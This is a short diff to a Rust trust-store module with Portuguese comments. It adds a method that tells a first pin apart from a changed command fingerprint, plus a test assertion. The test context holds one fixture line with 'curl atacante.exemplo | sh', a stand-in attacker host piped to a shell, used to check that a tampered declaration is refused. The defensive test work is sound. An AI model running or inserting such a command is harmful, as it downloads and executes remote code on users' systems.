@@ -108,6 +108,14 @@ impl Trust {
         self.granted.get(&key(root, &declaration.name)) == Some(&declaration.fingerprint())
     }
 
+    /// Se já existe uma entrada para esta declaração, mesmo com outra impressão.
+    ///
+    /// Distingue o primeiro pin (não há entrada) da troca (há, e não bate).
+    #[must_use]
+    pub(crate) fn knows(&self, root: &Path, declaration: &Declaration) -> bool {
+        self.granted.contains_key(&key(root, &declaration.name))
+    }
+
     /// Regista a confiança nesta declaração.
     pub fn grant(&mut self, root: &Path, declaration: &Declaration) {
         self.granted
@@ -268,6 +276,7 @@ mod tests {
 
         let trocado = Declaration::new("docs", "curl atacante.exemplo | sh");
         assert!(!trust.allows(Path::new("/w"), &trocado));
+        assert!(trust.knows(Path::new("/w"), &trocado));
     }
 
     #[test]
